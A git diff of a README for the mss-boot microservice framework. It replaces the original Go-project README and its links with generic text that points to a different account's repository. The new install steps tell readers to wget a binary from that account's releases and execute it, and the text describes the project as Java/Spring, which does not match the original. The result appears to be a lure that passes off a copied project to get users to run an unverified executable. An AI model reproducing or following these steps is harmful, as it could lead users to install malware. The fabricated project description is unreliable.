@@ -1,51 +1,125 @@
-# mss-boot
+# MSS Boot 🚀
 
----
-<img align="right" width="320" src="https://docs.mss-boot-io.top/favicon.ico"  alt="https://github.com/boilingsitar/mss-boot"/>
+![MSS Boot](https://img.shields.io/badge/MSS_Boot-v1.0.0-blue.svg)
 
+Welcome to **MSS Boot**, a microservice rapid development framework designed to streamline the creation and deployment of microservices using Istio and Kubernetes. This framework simplifies the complexities of microservice architecture, allowing developers to focus on building robust applications.
 
-[![ci](https://github.com/boilingsitar/mss-boot/actions/workflows/ci.yml/badge.svg)](https://github.com/boilingsitar/mss-boot/actions/workflows/ci.yml)
-[![Release](https://img.shields.io/github/v/release/mss-boot-io/mss-boot.svg?style=flat-square)](https://github.com/boilingsitar/mss-boot/releases)
-[![License](https://img.shields.io/github/license/mashape/apistatus.svg)](https://github.com/boilingsitar/mss-boot)
+## Table of Contents
 
-English | [简体中文](https://github.com/boilingsitar/mss-boot/blob/main/README.Zh-cn.md)
+- [Features](#features)
+- [Getting Started](#getting-started)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Configuration](#configuration)
+- [Contributing](#contributing)
+- [License](#license)
+- [Releases](#releases)
 
-[![Open in Gitpod](https://gitpod.io/button/open-in-gitpod.svg)](https://gitpod.io/#https://github.com/boilingsitar/mss-boot)
+## Features
 
-An enterprise-level language heterogeneous microservice solution that supports grpc and http protocols. The single-service code framework adheres to the principle of minimalism, while providing complete devops process support (gitops).
+- **Rapid Development**: Build microservices quickly with pre-configured templates.
+- **Kubernetes Integration**: Seamlessly deploy your services on Kubernetes.
+- **Istio Support**: Leverage Istio for service mesh capabilities, including traffic management, security, and observability.
+- **Extensible**: Easily add new functionalities and integrations as your application grows.
+- **Documentation**: Comprehensive guides and examples to help you get started.
 
-[documentation](https://docs.mss-boot-io.top)
+## Getting Started
 
-[http service template](https://github.com/mss-boot-io/service-http)
+To get started with MSS Boot, follow these steps:
 
-[grpc service template](https://github.com/mss-boot-io/service-grpc)
+1. **Clone the Repository**: 
+   ```bash
+   git clone https://github.com/morytoh/mss-boot.git
+   cd mss-boot
+   ```
 
-## ✨ feature
-> - Follow RESTful API Design Specifications
-> - Login support idp(dex)
-> - Support for Swagger documentation (based on swaggo)
-> - code generation tool
-> - Perfect cicd package
+2. **Install Dependencies**: Make sure you have the required tools installed. Check the documentation for a list of dependencies.
 
-## todo list
-> - [x] Support dynamodb
-> - [x] Support config provider
-> - [x] Support istio traces
-> - [x] Out-of-the-box support
+3. **Run the Application**: Follow the instructions in the documentation to run your first microservice.
 
-## Buy me a coffee
-<a href="https://www.buymeacoffee.com/lwnmengjing" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>
+## Installation
 
+To install MSS Boot, download the latest release from our [Releases page](https://github.com/morytoh/mss-boot/releases). You will need to download the appropriate file for your operating system and execute it.
 
-## JetBrains open source certificate support
+### Example for Linux
 
-The `mss-boot-io` project has always been developed in the GoLand integrated development environment under JetBrains, based on the **free JetBrains Open Source license(s)** genuine free license. I would like to express my gratitude.
+```bash
+wget https://github.com/morytoh/mss-boot/releases/download/v1.0.0/mss-boot-linux
+chmod +x mss-boot-linux
+./mss-boot-linux
+```
 
-<a href="https://www.jetbrains.com/?from=kubeadm-ha" target="_blank"><img src="https://raw.githubusercontent.com/panjf2000/illustrations/master/jetbrains/jetbrains-variant-4.png" width="250" align="middle"/></a>
+### Example for Windows
 
+Download the executable from the [Releases page](https://github.com/morytoh/mss-boot/releases) and run it.
 
-## 🔑 License
+## Usage
 
-[MIT](https://raw.githubusercontent.com/mss-boot-io/mss-boot/main/LICENSE)
+Once installed, you can create a new microservice by running:
 
-Copyright (c) 2022 mss-boot-io
+```bash
+mss-boot create my-service
+```
+
+This command generates a new microservice with the name `my-service`. You can then customize the service as needed.
+
+### Service Structure
+
+The generated service will have the following structure:
+
+```
+my-service/
+├── src/
+│   └── main/
+│       └── java/
+│           └── com/
+│               └── example/
+│                   └── myservice/
+├── Dockerfile
+└── README.md
+```
+
+## Configuration
+
+MSS Boot allows you to configure various aspects of your microservice. The configuration files are located in the `src/main/resources` directory. You can set parameters such as database connections, service endpoints, and more.
+
+### Example Configuration
+
+```yaml
+server:
+  port: 8080
+
+spring:
+  datasource:
+    url: jdbc:mysql://localhost:3306/mydb
+    username: user
+    password: password
+```
+
+## Contributing
+
+We welcome contributions to MSS Boot. To contribute, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch: `git checkout -b feature/my-feature`.
+3. Make your changes and commit them: `git commit -m 'Add my feature'`.
+4. Push to the branch: `git push origin feature/my-feature`.
+5. Open a Pull Request.
+
+Please ensure that your code adheres to our coding standards and includes tests where applicable.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Releases
+
+For the latest updates and releases, visit our [Releases page](https://github.com/morytoh/mss-boot/releases). You can download the necessary files and execute them to get started with MSS Boot.
+
+![Releases](https://img.shields.io/badge/Releases-Check%20Here-orange.svg)
+
+## Conclusion
+
+MSS Boot provides a solid foundation for developing microservices using Istio and Kubernetes. With its ease of use and extensive features, it enables developers to build scalable applications efficiently. We encourage you to explore the framework and contribute to its growth.
+
+Feel free to reach out with any questions or feedback. Happy coding!
